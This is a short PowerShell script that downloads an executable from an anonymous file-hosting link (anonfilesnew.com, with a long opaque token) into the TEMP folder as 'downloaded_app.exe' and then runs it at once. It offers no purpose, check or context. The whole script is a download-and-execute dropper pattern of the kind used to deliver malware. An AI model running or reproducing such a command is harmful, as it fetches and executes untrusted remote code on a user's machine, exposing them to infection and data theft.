# Define the URL and the destination path
$url = "https://anonfilesnew.com/content/v4?s=6fMGG9BrVMPR44l3papK2gKDZ65ubf6UrzWLZeipGGGaiI2FjDFfNGX519AiA8MEUAT_cXNI_8pgqdTxTXjyvwNM6iCRg3VJGtuD6NpfMXKZEji4_1ZYuanDvtDgvP3E4BNGRYHsj5eRkZtvOT0M"
$outputPath = "$env:TEMP\downloaded_app.exe"

Write-Host "Downloading file..." -ForegroundColor Cyan
# Download the file
Invoke-WebRequest -Uri $url -OutFile $outputPath

Write-Host "Running executable..." -ForegroundColor Green
# Execute the downloaded file
Start-Process -FilePath $outputPath
